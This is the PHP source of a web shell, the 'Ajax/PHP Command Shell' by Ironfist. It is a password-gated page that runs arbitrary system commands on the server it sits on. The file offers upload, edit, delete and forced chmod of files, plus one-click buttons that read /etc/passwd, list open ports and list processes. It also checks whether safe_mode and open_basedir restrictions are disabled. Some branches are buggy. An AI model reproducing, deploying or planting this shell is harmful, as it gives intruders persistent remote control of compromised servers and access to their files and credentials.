<?php
session_start();

error_reporting(0);

$password = "password";		 //Change this to your password ;)

$version = "0.7B";

$functions = array('Clear Screen' => 'ClearScreen()',
'Clear History' => 'ClearHistory()',
'Can I function?' => "runcommand('canirun','GET')",
'Get server info' => "runcommand('showinfo','GET')",
'Read /etc/passwd' => "runcommand('etcpasswdfile','GET')",
'Open ports' => "runcommand('netstat -an | grep -i listen','GET')",
'Running processes' => "runcommand('ps -aux','GET')",
'Readme' => "runcommand('shellhelp','GET')"

);
$thisfile = basename(__FILE__);

$style = '<style type="text/css">
.cmdthing {
    border-top-width: 0px;
    font-weight: bold;
    border-left-width: 0px;
    font-size: 10px;
    border-left-color: #000000;
    background: #000000;
    border-bottom-width: 0px;
    border-bottom-color: #FFFFFF;
    color: #FFFFFF;
    border-top-color: #008000;
    font-family: verdana;
    border-right-width: 0px;
    border-right-color: #000000;
}
input,textarea {
    border-top-width: 1px;
    font-weight: bold;
    border-left-width: 1px;
    font-size: 10px;
    border-left-color: #FFFFFF;
    background: #000000;
    border-bottom-width: 1px;
    border-bottom-color: #FFFFFF;
    color: #FFFFFF;
    border-top-color: #FFFFFF;
    font-family: verdana;
    border-right-width: 1px;
    border-right-color: #FFFFFF;
}
A:hover {
text-decoration: none;
}


table,td,div {
border-collapse: collapse;
border: 1px solid #FFFFFF;
}
body {
color: #FFFFFF;
font-family: verdana;
}
</style>';
$sess = __FILE__.$password;
if(isset($_POST['p4ssw0rD']))
{
	if($_POST['p4ssw0rD'] == $password)
	{
		$_SESSION[$sess] = $_POST['p4ssw0rD'];
	}
	else
	{
		die("Wrong password");
	}

}
if($_SESSION[$sess] == $password)
{
	if(isset($_SESSION['workdir']))
	{
			if(file_exists($_SESSION['workdir']) && is_dir($_SESSION['workdir']))
		{
			chdir($_SESSION['workdir']);
		}
	}

	if(isset($_FILES['uploadedfile']['name']))
	{
		$target_path = "./";
		$target_path = $target_path . basename( $_FILES['uploadedfile']['name']); 
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
			
		}
	}

	if(isset($_GET['runcmd']))
	{

		$cmd = $_GET['runcmd'];

		print "<b>".get_current_user()."~# </b>". htmlspecialchars($cmd)."<br>";

		if($cmd == "")
		{
			print "Empty Command..type \"shellhelp\" for some ehh...help";
		}

		elseif($cmd == "upload")
		{
			print '<br>Uploading to: '.realpath(".");
			if(is_writable(realpath(".")))
			{
				print "<br><b>I can write to this directory</b>";
			}
			else
			{
				print "<br><b><font color=red>I can't write to this directory, please choose another one.</b></font>";
			}

		}
		elseif((ereg("changeworkdir (.*)",$cmd,$file)) || (ereg("cd (.*)",$cmd,$file)))
		{
				if(file_exists($file[1]) && is_dir($file[1]))
				{
					chdir($file[1]);
					$_SESSION['workdir'] = $file[1];
					print "Current directory changed to ".$file[1];
				}
			else
			{
				print "Directory not found";
			}
		}

		elseif(strtolower($cmd) == "shellhelp")
		{
print '<b><font size=7>Ajax/PHP Command Shell</b></font>
&copy; By Ironfist

The shell can be used by anyone to command any server, the main purpose was
to create a shell that feels as dynamic as possible, is expandable and easy
to understand.

If one of the command execution functions work, the shell will function fine. 
Try the "canirun" command to check this.

Any (not custom) command is a UNIX command, like ls, cat, rm ... If you\'re 
not used to these commands, google a little. 

<b>Custom Functions</b>
If you want to add your own custom command in the Quick Commands list, check 
out the code. The $function array contains \'func name\' => \'javascript function\'.
Take a look at the built-in functions for examples.

I know this readme isn\'t providing too much information, but hell, does this shell
even require one :P

- Iron
			';

		}
		elseif(ereg("editfile (.*)",$cmd,$file))
		{
			if(file_exists($file[1]) && !is_dir($file[1]))
			{
				print "<form name=\"saveform\"><textarea cols=70 rows=10 id=\"area1\">";
				$contents = file($file[1]);
					foreach($contents as $line)
					{
						print htmlspecialchars($line);
					}
				print "</textarea><br><input size=80 type=text name=filetosave value=".$file[1]."><input value=\"Save\" type=button onclick=\"SaveFile();\"></form>";
			}
			else
			{
			print "File not found.";
			}
		}
		elseif(ereg("deletefile (.*)",$cmd,$file))
		{
			if(is_dir($file[1]))
			{
				if(rmdir($file[1]))
				{
					print "Directory succesfully deleted.";
				}
				else
				{
					print "Couldn't delete directory!";
				}
			}
			else
			{
				if(unlink($file[1]))
				{
					print "File succesfully deleted.";
				}
				else
				{
					print "Couldn't delete file!";
				}
			}
		}
		elseif(strtolower($cmd) == "canirun")
		{
		print "If any of these functions is Enabled, the shell will function like it should.<br>";
			if(function_exists(passthru))
			{
				print "Passthru: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Passthru: <b><font color=red>Disabled</b></font><br>";
			}

			if(function_exists(exec))
			{
				print "Exec: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Exec: <b><font color=red>Disabled</b></font><br>";
			}

			if(function_exists(system))
			{
				print "System: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "System: <b><font color=red>Disabled</b></font><br>";
			}
			if(function_exists(shell_exec))
			{
				print "Shell_exec: <b><font color=green>Enabled</b></font><br>";
			}
			else
			{
				print "Shell_exec: <b><font color=red>Disabled</b></font><br>";
			}
		print "<br>Safe mode will prevent some stuff, maybe command execution, if you're looking for a <br>reason why the commands aren't executed, this is probally it.<br>";
		if( ini_get('safe_mode') ){
			print "Safe Mode: <b><font color=red>Enabled</b></font>";
		}
			else
		{
			print "Safe Mode: <b><font color=green>Disabled</b></font>";
		}
		print "<br><br>Open_basedir will block access to some files you <i>shouldn't</i> access.<br>";
			if( ini_get('open_basedir') ){
				print "Open_basedir: <b><font color=red>Enabled</b></font>";
			}
			else
			{
				print "Open_basedir: <b><font color=green>Disabled</b></font>";
			}
		}
		//About the shell
		elseif(ereg("listdir (.*)",$cmd,$directory))
		{

			if(!file_exists($directory[1]))
			{
				die("Directory not found");
			}
			//Some variables
			chdir($directory[1]);
			$i = 0; $f = 0;
			$dirs = "";
			$filez = "";
			
				if(!ereg("/$",$directory[1])) //Does it end with a slash?
				{
					$directory[1] .= "/"; //If not, add one
				}
			print "Listing directory: ".$directory[1]."<br>";
			print "<table border=0><td><b>Directories</b></td><td><b>Files</b></td><tr>";
			
			if ($handle = opendir($directory[1])) {
			   while (false !== ($file = readdir($handle))) {
				   if(is_dir($file))
				   {
					   $dirs[$i]  = $file;
					   $i++;
				   }
				   else
				   {
					   $filez[$f] = $file;
					   $f++;
				   }
				   
			   }
			   print "<td>";
			   
			   foreach($dirs as $directory)
			   {
					print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($directory)."');\">[D]</i><i style=\"cursor:crosshair\" onclick=\"runcommand('changeworkdir ".realpath($directory)."','GET');\">[W]</i><b style=\"cursor:crosshair\" onclick=\"runcommand('clear','GET'); runcommand ('listdir ".realpath($directory)."','GET'); \">".$directory."</b><br>";
			   }
			   
			   print "</td><td>";
			   
			   foreach($filez as $file)
			   {
				print "<i style=\"cursor:crosshair\" onclick=\"deletefile('".realpath($file)."');\">[D]</i><u style=\"cursor:crosshair\" onclick=\"runcommand('editfile ".realpath($file)."','GET');\">".$file."</u><br>";
			   }
			   
			   print "</td></table>";
			}
		}
		elseif(strtolower($cmd) == "about")
		{
			print "Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version";
		}
		//Show info
		elseif(strtolower($cmd) == "showinfo")
		{
			if(function_exists(disk_free_space))
			{
				$free = disk_free_space("/") / 1000000;
			}
			else
			{
				$free = "N/A";
			}
			if(function_exists(disk_total_space))
			{
				$total = trim(disk_total_space("/") / 1000000);
			}
			else
			{
				$total = "N/A";
			}
			$path = realpath (".");
			
			print "<b>Free:</b> $free / $total MB<br><b>Current path:</b> $path<br><b>Uname -a Output:</b><br>";
			
			if(function_exists(passthru))
			{
				passthru("uname -a");
			}
			else
			{
				print "Passthru is disabled :(";
			}
		}
		//Read /etc/passwd
		elseif(strtolower($cmd) == "etcpasswdfile")
		{

			$pw = file('/etc/passwd/');
			foreach($pw as $line)
			{
				print $line;
			}


		}
		//Execute any other command
		else
		{

			if(function_exists(passthru))
			{
				passthru($cmd);
			}
			else
			{
				if(function_exists(exec))
				{
					exec("ls -la",$result);
					foreach($result as $output)
					{
						print $output."<br>";
					}
				}
				else
				{
				if(function_exists(system))
				{
					system($cmd);
				}
				else
				{
					if(function_exists(shell_exec))
					{
						print shell_exec($cmd);
					}
						else
						{
						print "Sorry, none of the command functions works.";
						}
					}
				}
			}
		}
	}

	elseif(isset($_GET['savefile']) && !empty($_POST['filetosave']) && !empty($_POST['filecontent']))
	{
		$file = $_POST['filetosave'];
		if(!is_writable($file))
		{
			if(!chmod($file, 0777))
			{
				die("Nope, can't chmod nor save :("); //In fact, nobody ever reads this message ^_^
			}
		}
		
		$fh = fopen($file, 'w');
		$dt = $_POST['filecontent'];
		fwrite($fh, $dt);
		fclose($fh);
	}
	else
	{
?><?php print getenv("HTTP_HOST"); ?><?php print $style; ?><?php print $ThisFile; ?><?php print $ThisFile; ?><?php
		$folders = "<form name=workdir onsubmit=\"return runcommand(\'changeworkdir \' + document.workdir.changeworkdir.value,\'GET\');\"><input size=80% type=text name=changeworkdir value=\"";
		$pathparts = explode("/",realpath ("."));
		foreach($pathparts as $folder)
		{
		$folders .= $folder."/";
		}
		$folders .= "\"><input type=submit value=Change></form><br>Script directory: <i style=\"cursor:crosshair\"  onclick=\"document.workdir.changeworkdir.value=\'".dirname(__FILE__)."\'>".dirname(__FILE__)."</i>";

		?><?php print $folders; ?><?php print realpath('.')."/".rand(1000,999999).".txt"; ?><?php
foreach($functions as $name => $execute)
{
print '&nbsp;<input type="button" value="'.$name.'" onclick="'.$execute.'"><br>';
}
?><?php print $version; ?><?php
}
} else {
print "<center><table border=0  height=100%>
<td valign=middle>
<form action=".basename(__FILE__)." method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password name=p4ssw0rD><input type=submit value=\"Log in\">
</form>";
}
?>